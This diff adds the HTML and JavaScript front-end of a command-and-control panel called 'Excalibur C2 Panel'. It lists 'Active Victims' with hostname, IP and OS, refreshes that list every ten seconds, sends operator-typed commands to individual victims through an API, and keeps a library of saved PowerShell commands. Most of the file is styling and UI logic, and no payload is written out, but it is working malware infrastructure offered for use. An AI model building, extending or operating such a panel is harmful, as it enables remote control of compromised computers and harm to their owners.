@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Excalibur C2 Panel</title>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;600&family=IBM+Plex+Mono&display=swap" rel="stylesheet">
+  <style>
+    /* Global Variables - MacOS-Inspired White Mode */
+    :root {
+      --bg-primary: #ffffff; /* Pure White for main background */
+      --bg-secondary: #f0f0f0; /* Light gray for cards/panels, subtle distinction */
+      --text-primary: #333333; /* Dark gray for standard text */
+      --text-secondary: #1a1a1a; /* Very dark gray/black for headings */
+      --accent-main: #007aff; /* Apple-like blue for primary actions */
+      --accent-hover: #005bb5; /* Darker blue for hover states */
+      --border-color-light: #e0e0e0; /* Very light gray for subtle borders */
+      --border-color-dark: #cccccc; /* Slightly darker gray for more definition */
+      --input-bg: #f9f9f9; /* Very light background for inputs */
+      --input-text-color: #000000; /* Black text for inputs */
+      --focus-ring-color: rgba(0, 122, 255, 0.25); /* Subtle blue glow for focus */
+      --success-color: #28a745; /* Standard green */
+      --error-color: #dc3545; /* Standard red */
+      --info-color: #17a2b8; /* Standard cyan/blue for info */
+      --shadow-light: rgba(0, 0, 0, 0.08); /* Light shadow for depth */
+      --shadow-heavy: rgba(0, 0, 0, 0.15); /* Heavier shadow for modals */
+      --modal-overlay-bg: rgba(255, 255, 255, 0.7); /* Translucent white modal overlay */
+
+      --font-family-sans: 'IBM Plex Sans', sans-serif;
+      --font-family-mono: 'IBM Plex Mono', monospace;
+    }
+
+    /* Base Styles */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      font-family: var(--font-family-sans);
+      line-height: 1.6;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      padding: 30px; /* Generous padding around the page */
+      position: relative;
+    }
+
+    /* Headings */
+    h1 {
+      color: var(--text-secondary);
+      font-weight: 600;
+      letter-spacing: -0.02em; /* Tighter letter spacing for modern feel */
+      font-size: 3em; /* Large, prominent title */
+      margin-bottom: 50px;
+      text-align: center;
+      line-height: 1.1;
+    }
+
+    h2 {
+      color: var(--text-secondary);
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      font-size: 2em;
+      margin-bottom: 30px;
+      border-bottom: 1px solid var(--border-color-light);
+      padding-bottom: 15px;
+      text-align: left;
+    }
+
+    h3 {
+      color: var(--text-secondary);
+      font-weight: 600;
+      font-size: 1.7em;
+      margin-bottom: 25px;
+      border-bottom: 1px solid var(--border-color-light);
+      padding-bottom: 12px;
+      text-align: left;
+    }
+
+    h4 {
+      color: var(--text-primary);
+      font-weight: 400;
+      font-size: 1.3em;
+      margin-bottom: 20px;
+      border-bottom: 1px solid var(--border-color-light);
+      padding-bottom: 10px;
+      text-align: left;
+    }
+
+    /* Container & Panel Cards */
+    .container {
+      width: 100%;
+      max-width: 1400px; /* Wide but contained layout */
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 40px; /* Consistent spacing between major blocks */
+    }
+
+    .panel-card {
+      background-color: var(--bg-secondary);
+      border-radius: 10px; /* Slightly rounded corners */
+      padding: 40px; /* Generous internal padding */
+      box-shadow: 0 5px 15px var(--shadow-light); /* Subtle shadow for elevation */
+      border: 1px solid var(--border-color-light);
+      transition: all 0.2s ease-in-out;
+    }
+
+    .panel-card:hover {
+      box-shadow: 0 8px 20px var(--shadow-heavy);
+    }
+
+    /* Table Styles */
+    .table-responsive {
+      max-height: 65vh; /* Controlled height for scroll */
+      overflow-y: auto;
+      border: 1px solid var(--border-color-light);
+      border-radius: 8px;
+      background-color: var(--bg-primary); /* Pure white background for table area */
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      table-layout: auto;
+      margin-top: 0;
+    }
+
+    th, td {
+      padding: 18px 25px; /* Ample padding in cells */
+      text-align: left;
+      word-break: break-word;
+      font-size: 0.95em;
+      border-bottom: 1px solid var(--border-color-light); /* Clean horizontal dividers */
+    }
+
+    th {
+      background-color: var(--bg-secondary); /* Light grey header background */
+      font-weight: 600;
+      color: var(--text-secondary);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    tr:nth-child(even) {
+      background-color: #fcfcfc; /* Very subtle alternating row */
+    }
+
+    tr:hover {
+      background-color: #f5f5f5; /* Light hover effect */
+      transition: background-color 0.15s ease;
+    }
+
+    /* Input Fields & Textareas */
+    textarea, input[type="text"] {
+      width: 100%;
+      padding: 14px 18px; /* Generous padding */
+      background-color: var(--input-bg);
+      color: var(--input-text-color);
+      border: 1px solid var(--border-color-dark); /* Clear border */
+      border-radius: 6px; /* Slightly rounded */
+      font-family: var(--font-family-mono);
+      font-size: 1em;
+      resize: vertical;
+      box-sizing: border-box;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+
+    textarea:focus, input[type="text"]:focus {
+      outline: none;
+      border-color: var(--accent-main); /* Blue border on focus */
+      box-shadow: 0 0 0 3px var(--focus-ring-color); /* Subtle blue glow */
+    }
+
+    input[type="text"]::placeholder {
+      color: #999999; /* Light grey placeholder */
+    }
+
+    /* Buttons */
+    button {
+      padding: 12px 25px; /* Ample padding */
+      background-color: var(--accent-main);
+      color: white; /* White text on blue accent */
+      border: none;
+      border-radius: 6px; /* Matches input roundedness */
+      cursor: pointer;
+      font-size: 0.95rem;
+      font-family: var(--font-family-sans);
+      transition: background-color 0.2s ease, transform 0.1s ease, box-shadow 0.2s ease;
+      text-transform: capitalize; /* More natural capitalization */
+      letter-spacing: 0.2px;
+      box-shadow: 0 2px 5px var(--shadow-light); /* Subtle shadow */
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+
+    button:hover {
+      background-color: var(--accent-hover);
+      transform: translateY(-1px); /* Slight lift */
+      box-shadow: 0 4px 8px var(--shadow-heavy);
+    }
+
+    button:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 5px var(--shadow-light);
+    }
+
+    button:focus-visible {
+      outline: none;
+      box-shadow: 0 0 0 3px var(--focus-ring-color);
+    }
+
+    button.delete-btn {
+      background-color: var(--error-color);
+      padding: 8px 15px; /* Smaller for inline use */
+      font-size: 0.8em;
+      margin-left: 10px;
+      color: white;
+    }
+
+    button.delete-btn:hover {
+      background-color: #c82333;
+    }
+
+    button.cancel-btn {
+      background-color: #cccccc; /* Neutral grey for cancel */
+      color: var(--text-primary);
+    }
+
+    button.cancel-btn:hover {
+      background-color: #b0b0b0;
+    }
+
+    /* Specific Layouts */
+    .header-bar {
+        width: 100%;
+        max-width: 1400px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 50px; /* Space from content */
+        padding: 0 10px; /* Slight horizontal padding */
+    }
+
+    #global-manage-commands-btn {
+      position: static; /* Remove absolute positioning */
+      margin-left: auto; /* Push to the right */
+      padding: 12px 25px;
+      font-size: 0.9em;
+      box-shadow: none; /* No shadow for a flatter, macOS feel */
+      border: 1px solid var(--border-color-dark); /* Subtle border */
+      background-color: #ffffff; /* White background */
+      color: var(--text-primary); /* Dark text */
+    }
+
+    #global-manage-commands-btn:hover {
+        background-color: #f5f5f5;
+        transform: none; /* No lift */
+        box-shadow: none;
+        border-color: var(--accent-main); /* Blue border on hover */
+    }
+
+    .command-cell {
+      display: flex;
+      flex-direction: column;
+      gap: 15px; /* More space */
+    }
+
+    /* Notifications/Alerts */
+    .notification {
+      position: fixed;
+      top: 30px;
+      right: 30px;
+      background-color: var(--success-color);
+      color: white;
+      padding: 16px 25px;
+      border-radius: 8px; /* Slightly more rounded */
+      box-shadow: 0 4px 12px var(--shadow-heavy);
+      z-index: 1000;
+      opacity: 0;
+      transform: translateY(-20px);
+      animation: fadeInOut 3.5s forwards;
+      font-family: var(--font-family-sans);
+    }
+
+    .notification.error {
+      background-color: var(--error-color);
+    }
+
+    .notification.info {
+      background-color: var(--info-color);
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translateY(-20px); }
+      10% { opacity: 1; transform: translateY(0); }
+      90% { opacity: 1; transform: translateY(0); }
+      100% { opacity: 0; transform: translateY(-20px); }
+    }
+
+    /* Modal Overlays */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--modal-overlay-bg);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1001;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    /* Modal Content */
+    .modal-content {
+      background-color: var(--bg-secondary);
+      border-radius: 10px;
+      padding: 40px;
+      box-shadow: 0 10px 30px var(--shadow-heavy);
+      border: 1px solid var(--border-color-light);
+      width: 90%;
+      max-width: 700px; /* Wider modals */
+      transform: translateY(-50px);
+      opacity: 0;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+    }
+
+    .modal-overlay.active .modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    .modal-content p {
+      margin-bottom: 25px;
+      font-size: 1.05em;
+      text-align: center;
+    }
+
+    .modal-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 30px;
+    }
+
+    .modal-buttons button {
+      margin: 0;
+      min-width: 150px;
+    }
+
+    .modal-close-btn {
+      background-color: #e0e0e0; /* Light grey close button */
+      color: var(--text-primary);
+      align-self: flex-end;
+      margin-top: auto;
+      box-shadow: none;
+      border: 1px solid var(--border-color-dark);
+    }
+    .modal-close-btn:hover {
+      background-color: #d0d0d0;
+      transform: none;
+      box-shadow: none;
+      border-color: var(--accent-main);
+    }
+
+    /* Manage Commands Modal specific styles */
+    #manage-command-form {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      align-items: stretch;
+      padding-bottom: 25px;
+      border-bottom: 1px solid var(--border-color-light);
+      margin-bottom: 25px;
+    }
+    #manage-command-form .form-actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      margin-top: 15px;
+    }
+    #manage-command-form .form-actions button {
+      margin: 0;
+    }
+
+    #manage-commands-list {
+      max-height: 300px;
+      overflow-y: auto;
+      border: 1px solid var(--border-color-light);
+      border-radius: 6px;
+      padding: 15px;
+      background-color: var(--bg-primary);
+    }
+    .manage-command-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 15px;
+      border-bottom: 1px solid var(--border-color-light);
+    }
+    .manage-command-item:last-child {
+      border-bottom: none;
+    }
+    .manage-command-item .command-name {
+      color: var(--text-primary);
+      cursor: pointer;
+      flex-grow: 1;
+      text-align: left;
+      font-weight: 400;
+      font-size: 1.05em;
+      transition: color 0.2s ease;
+      padding-right: 15px;
+    }
+    .manage-command-item .command-name:hover {
+      color: var(--accent-main);
+    }
+    .manage-command-item .action-buttons {
+      display: flex;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+    .manage-command-item .action-buttons button {
+      margin: 0;
+      padding: 6px 12px;
+      font-size: 0.75em;
+      text-transform: none;
+      letter-spacing: normal;
+    }
+
+    /* Execute Saved Command Modal specific styles */
+    #execute-commands-list {
+      max-height: 400px;
+      overflow-y: auto;
+      border: 1px solid var(--border-color-light);
+      border-radius: 6px;
+      padding: 15px;
+      background-color: var(--bg-primary);
+    }
+    .execute-command-item {
+      padding: 15px;
+      border-bottom: 1px solid var(--border-color-light);
+      cursor: pointer;
+      text-align: left;
+      font-size: 1.1em;
+      transition: background-color 0.2s ease, color 0.2s ease;
+      outline: none;
+    }
+    .execute-command-item:last-child {
+      border-bottom: none;
+    }
+    .execute-command-item:hover {
+      background-color: #f5f5f5;
+      color: var(--accent-main);
+    }
+    .execute-command-item:focus-visible {
+      background-color: #f0f0f0;
+      box-shadow: inset 0 0 0 2px var(--focus-ring-color);
+    }
+
+    /* Media Queries for Responsiveness */
+    @media (max-width: 768px) {
+      body {
+        padding: 20px;
+      }
+
+      .header-bar {
+        flex-direction: column;
+        align-items: flex-start;
+        margin-bottom: 30px;
+      }
+
+      h1 {
+        font-size: 2.2em;
+        margin-bottom: 20px;
+        text-align: left;
+        width: 100%;
+      }
+
+      #global-manage-commands-btn {
+        margin-left: 0;
+        width: 100%;
+        margin-top: 15px;
+        text-align: center;
+      }
+
+      h2 {
+        font-size: 1.8em;
+        margin-bottom: 20px;
+      }
+
+      .panel-card {
+        padding: 30px;
+      }
+
+      .table-responsive {
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+      }
+      table {
+        min-width: 700px; /* Ensure table is still readable */
+      }
+      th, td {
+        font-size: 0.9em;
+        padding: 14px 18px;
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 0.85rem;
+      }
+
+      .modal-content {
+        padding: 30px;
+        width: 95%;
+      }
+
+      #manage-commands-list, #execute-commands-list {
+        max-height: 250px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 15px;
+      }
+
+      h1 {
+        font-size: 1.8em;
+      }
+      h2 {
+        font-size: 1.5em;
+      }
+      .panel-card {
+        padding: 20px;
+      }
+      textarea, input[type="text"] {
+        font-size: 0.85em;
+        padding: 12px;
+      }
+      button {
+        font-size: 0.75rem;
+        padding: 8px 15px;
+      }
+      .modal-content {
+        padding: 25px;
+        width: 98%;
+      }
+      .modal-buttons {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .modal-buttons button {
+        width: 100%;
+      }
+      th, td {
+        padding: 12px 15px;
+        font-size: 0.75em;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header-bar">
+    <h1>Excalibur C2 Panel</h1>
+    <button id="global-manage-commands-btn">Manage Saved Commands</button>
+  </div>
+
+  <div class="container">
+    <div class="panel-card">
+      <h2>Active Victims</h2>
+      <div class="table-responsive">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Hostname</th>
+              <th>IP</th>
+              <th>OS</th>
+              <th>Last Seen</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="victim-body">
+            </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div id="manage-commands-modal" class="modal-overlay">
+    <div class="modal-content">
+      <h3>Manage Saved Commands</h3>
+      <form id="manage-command-form">
+        <input type="hidden" id="manage-cmd-id"> <input type="text" id="manage-cmd-name" placeholder="Command Name" required />
+        <textarea id="manage-cmd-value" placeholder="PowerShell Command" rows="6" required></textarea>
+        <div class="form-actions">
+          <button type="submit" id="manage-form-submit-btn">Add Command</button>
+          <button type="button" id="manage-form-cancel-btn" class="cancel-btn" style="display:none;">Cancel Edit</button>
+        </div>
+      </form>
+
+      <h4>Existing Commands</h4>
+      <div id="manage-commands-list">
+        </div>
+      <button class="modal-close-btn" data-modal="manage-commands-modal">Close</button>
+    </div>
+  </div>
+
+  <div id="execute-saved-command-modal" class="modal-overlay">
+    <div class="modal-content">
+      <h3>Select Command for <span id="execute-victim-name"></span></h3>
+      <div id="execute-commands-list">
+        </div>
+      <button class="modal-close-btn" data-modal="execute-saved-command-modal">Close</button>
+    </div>
+  </div>
+
+  <div id="confirmation-modal" class="modal-overlay">
+    <div class="modal-content">
+      <h3 id="modal-title">Confirm Action</h3>
+      <p id="modal-message">Are you sure you want to proceed?</p>
+      <div class="modal-buttons">
+        <button id="modal-confirm-btn">Confirm</button>
+        <button id="modal-cancel-btn" class="cancel-btn">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- Global Data Storage (Client-side) ---
+    let currentVictims = [];
+    let currentSavedCommands = [];
+    let activeVictimForCommandSelection = null; // Stores victimId for the 'Load Command' popup
+
+    // --- Global Utility Functions ---
+    function showNotification(message, type = 'success') {
+      const notification = document.createElement('div');
+      notification.className = `notification ${type}`;
+      notification.textContent = message;
+      document.body.appendChild(notification);
+      setTimeout(() => { notification.remove(); }, 3000);
+    }
+
+    // Custom Confirmation Modal Logic (unchanged)
+    let _confirmCallback = null;
+    const confirmationModal = document.getElementById('confirmation-modal');
+    const modalTitle = document.getElementById('modal-title');
+    const modalMessage = document.getElementById('modal-message');
+    const modalConfirmBtn = document.getElementById('modal-confirm-btn');
+    const modalCancelBtn = document.getElementById('modal-cancel-btn');
+
+    function showConfirmationModal(title, message, callback) {
+      modalTitle.textContent = title;
+      modalMessage.textContent = message;
+      _confirmCallback = callback;
+      confirmationModal.classList.add('active');
+    }
+
+    function hideConfirmationModal() {
+      confirmationModal.classList.remove('active');
+      _confirmCallback = null;
+    }
+
+    modalConfirmBtn.onclick = () => {
+      if (_confirmCallback) { _confirmCallback(true); }
+      hideConfirmationModal();
+    };
+
+    modalCancelBtn.onclick = () => {
+      if (_confirmCallback) { _confirmCallback(false); }
+      hideConfirmationModal();
+    };
+
+    // --- Modal Management (Generic) ---
+    function openModal(modalId) {
+      document.getElementById(modalId).classList.add('active');
+    }
+
+    function closeModal(modalId) {
+      document.getElementById(modalId).classList.remove('active');
+    }
+
+    document.querySelectorAll('.modal-close-btn').forEach(button => {
+      button.addEventListener('click', (event) => {
+        const modalId = event.target.dataset.modal;
+        if (modalId) {
+          closeModal(modalId);
+        }
+      });
+    });
+
+
+    // --- Victim Management ---
+    async function fetchVictims() {
+      try {
+        const res = await fetch("/api/victims");
+        if (!res.ok) {
+          const errorData = await res.json();
+          throw new Error(errorData.detail || `HTTP error! status: ${res.status}`);
+        }
+        const data = await res.json();
+        currentVictims = data; // Update global data
+        populateVictimTable(data);
+      } catch (err) {
+        console.error("Error loading victims:", err);
+        showNotification(`Failed to load victims: ${err.message}`, 'error');
+      }
+    }
+
+    function populateVictimTable(victims) {
+      const body = document.getElementById("victim-body");
+      body.innerHTML = "";
+
+      if (victims.length === 0) {
+        body.innerHTML = '<tr><td colspan="6" style="text-align: center; padding: 25px; color: #999;">No active victims found.</td></tr>';
+      } else {
+        victims.forEach(v => {
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${v.victim_id}</td>
+            <td>${v.hostname}</td>
+            <td>${v.ip_address}</td>
+            <td>${v.os_info}</td>
+            <td>${new Date(v.last_seen).toLocaleString()}</td>
+            <td class="command-cell">
+              <textarea id="cmd-${v.victim_id}" placeholder="Enter command..."></textarea>
+              <button onclick="sendCommand('${v.victim_id}')">Send</button>
+              <button onclick="openExecuteSavedCommandModal('${v.victim_id}', '${v.hostname}')">Load Command</button>
+            </td>
+          `;
+          body.appendChild(row);
+        });
+      }
+    }
+
+    async function sendCommand(victimId) {
+      const cmdTextarea = document.getElementById(`cmd-${victimId}`);
+      const cmd = cmdTextarea.value.trim();
+
+      if (!cmd) {
+        showNotification("Command cannot be empty!", 'error');
+        return;
+      }
+
+      try {
+        const res = await fetch(`/api/victims/${victimId}/commands`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ command: cmd })
+        });
+
+        if (!res.ok) {
+          const errorData = await res.json();
+          throw new Error(errorData.detail || `HTTP error! status: ${res.status}`);
+        }
+
+        showNotification("Command sent successfully!");
+        cmdTextarea.value = '';
+      } catch (err) {
+        console.error("Error sending command:", err);
+        showNotification(`Failed to send command: ${err.message}`, 'error');
+      }
+    }
+
+    // --- Saved Commands Management (Manage Commands Modal) ---
+    const manageCommandsModal = document.getElementById('manage-commands-modal');
+    const manageCommandForm = document.getElementById('manage-command-form');
+    const manageCmdId = document.getElementById('manage-cmd-id');
+    const manageCmdName = document.getElementById('manage-cmd-name');
+    const manageCmdValue = document.getElementById('manage-cmd-value');
+    const manageFormSubmitBtn = document.getElementById('manage-form-submit-btn');
+    const manageFormCancelBtn = document.getElementById('manage-form-cancel-btn');
+    const manageCommandsListDiv = document.getElementById('manage-commands-list');
+
+    document.getElementById('global-manage-commands-btn').addEventListener('click', () => {
+      openModal('manage-commands-modal');
+      fetchSavedCommands(); // Always refresh list when opening
+      resetManageForm(); // Reset form when opening
+    });
+
+    async function fetchSavedCommands() {
+      try {
+        const res = await fetch("/api/saved-commands");
+        if (!res.ok) {
+          const errorData = await res.json();
+          throw new Error(errorData.detail || `HTTP error! status: ${res.status}`);
+        }
+        const data = await res.json();
+        currentSavedCommands = data;
+        populateManageCommandsList(data);
+        populateExecuteCommandsList(); // Also update the list for the other modal
+      } catch (err) {
+        console.error("Error loading saved commands:", err);
+        if (manageCommandsModal.classList.contains('active')) { // Only show notification if modal is open
+          showNotification(`Failed to load saved commands: ${err.message}`, 'error');
+        }
+      }
+    }
+
+    function populateManageCommandsList(cmds) {
+      manageCommandsListDiv.innerHTML = "";
+      if (cmds.length === 0) {
+        manageCommandsListDiv.innerHTML = '<p style="text-align: center; padding: 15px; color: #999;">No saved commands yet.</p>';
+      } else {
+        cmds.forEach(cmd => {
+          const div = document.createElement("div");
+          div.className = "manage-command-item";
+          div.innerHTML = `
+            <span class="command-name" data-id="${cmd.id}" title="Click to edit">${cmd.name}</span>
+            <div class="action-buttons">
+              <button onclick="editSavedCommand(${cmd.id})">Edit</button>
+              <button onclick="confirmDeleteCommand(${cmd.id})" class="delete-btn">Delete</button>
+            </div>
+          `;
+          manageCommandsListDiv.appendChild(div);
+        });
+      }
+    }
+
+    function resetManageForm() {
+      manageCmdId.value = '';
+      manageCmdName.value = '';
+      manageCmdValue.value = '';
+      manageFormSubmitBtn.textContent = 'Add Command';
+      manageFormCancelBtn.style.display = 'none';
+    }
+
+    function editSavedCommand(id) {
+      const command = currentSavedCommands.find(cmd => cmd.id === id);
+      if (command) {
+        manageCmdId.value = command.id;
+        manageCmdName.value = command.name;
+        manageCmdValue.value = command.value;
+        manageFormSubmitBtn.textContent = 'Update Command';
+        manageFormCancelBtn.style.display = 'inline-block';
+        manageCmdName.focus(); // Focus on the name field for immediate editing
+      } else {
+        showNotification("Command not found for editing.", "error");
+      }
+    }
+
+    manageCommandForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const id = manageCmdId.value;
+      const name = manageCmdName.value.trim();
+      const value = manageCmdValue.value.trim();
+
+      if (!name || !value) {
+        showNotification("Command name and value cannot be empty!", 'error');
+        return;
+      }
+
+      try {
+        let res;
+        if (id) { // Update existing command
+          res = await fetch(`/api/saved-commands/${id}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, value })
+          });
+          if (!res.ok) {
+            const err = await res.json();
+            throw new Error(err.detail || "Failed to update command");
+          }
+          showNotification("Command updated successfully!");
+        } else { // Add new command
+          res = await fetch("/api/saved-commands", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name, value })
+          });
+          if (!res.ok) {
+            const err = await res.json();
+            throw new Error(err.detail || "Failed to add command");
+          }
+          showNotification("Command added successfully!");
+        }
+        resetManageForm();
+        fetchSavedCommands(); // Re-fetch and re-populate both lists
+      } catch (err) {
+        console.error("Error saving command:", err);
+        showNotification(`Failed to save command: ${err.message}`, 'error');
+      }
+    });
+
+    manageFormCancelBtn.addEventListener('click', resetManageForm);
+
+    function confirmDeleteCommand(id) {
+      showConfirmationModal(
+        'Confirm Deletion',
+        'Are you sure you want to delete this saved command?',
+        async (result) => {
+          if (result) {
+            await deleteCommand(id);
+          } else {
+            showNotification('Deletion cancelled.', 'info');
+          }
+        }
+      );
+    }
+
+    async function deleteCommand(id) {
+      try {
+        const res = await fetch(`/api/saved-commands/${id}`, { method: "DELETE" });
+        if (!res.ok) {
+          const errorData = await res.json();
+          throw new Error(errorData.detail || `HTTP error! status: ${res.status}`);
+        }
+        showNotification("Command deleted successfully!");
+        fetchSavedCommands(); // Re-fetch and re-populate both lists
+        if (manageCmdId.value == id) { // If the deleted command was being edited
+            resetManageForm();
+        }
+      } catch (err) {
+        console.error("Error deleting command:", err);
+        showNotification(`Failed to delete command: ${err.message}`, 'error');
+      }
+    }
+
+
+    // --- Execute Saved Command (Victim-Specific Modal) ---
+    const executeSavedCommandModal = document.getElementById('execute-saved-command-modal');
+    const executeVictimNameSpan = document.getElementById('execute-victim-name');
+    const executeCommandsListDiv = document.getElementById('execute-commands-list');
+
+    function openExecuteSavedCommandModal(victimId, hostname) {
+      activeVictimForCommandSelection = victimId;
+      executeVictimNameSpan.textContent = hostname || victimId; // Show hostname if available
+      populateExecuteCommandsList(); // Always re-populate when opening
+      openModal('execute-saved-command-modal');
+      // Optional: Focus the first command in the list for accessibility
+      const firstCommandItem = executeCommandsListDiv.querySelector('.execute-command-item');
+      if (firstCommandItem) {
+        firstCommandItem.focus();
+      }
+    }
+
+    function populateExecuteCommandsList() {
+      executeCommandsListDiv.innerHTML = "";
+      if (currentSavedCommands.length === 0) {
+        executeCommandsListDiv.innerHTML = '<p style="text-align: center; padding: 15px; color: #999;">No saved commands available.</p>';
+      } else {
+        currentSavedCommands.forEach(cmd => {
+          const div = document.createElement("div");
+          div.className = "execute-command-item";
+          div.textContent = cmd.name;
+          div.dataset.commandValue = cmd.value; // Store the actual command value
+          div.setAttribute('tabindex', '0'); // Make it focusable for keyboard navigation
+          div.addEventListener('click', (event) => {
+            const commandValue = event.target.dataset.commandValue;
+            insertCommandToVictim(activeVictimForCommandSelection, commandValue);
+            closeModal('execute-saved-command-modal');
+          });
+          executeCommandsListDiv.appendChild(div);
+        });
+      }
+    }
+
+    function insertCommandToVictim(victimId, commandValue) {
+      const victimCommandTextarea = document.getElementById(`cmd-${victimId}`);
+      if (victimCommandTextarea) {
+        victimCommandTextarea.value = commandValue;
+        victimCommandTextarea.focus(); // Bring textarea into focus
+        showNotification(`Command inserted into victim ${victimId}'s input.`, 'success');
+      } else {
+        showNotification(`Could not find command input for victim ${victimId}. This victim might have disconnected.`, 'error');
+        fetchVictims(); // Re-fetch victims to clean up potential stale data
+      }
+    }
+
+    // --- Event Listeners and Initial Load ---
+    document.addEventListener("DOMContentLoaded", () => {
+      // Initial data fetch
+      fetchVictims();
+      fetchSavedCommands(); // Fetch saved commands once on load
+
+      // Set up auto-refresh for victims
+      setInterval(fetchVictims, 10000); // Refresh victims every 10 seconds
+    });
+  </script>
+
+</body>
+</html>
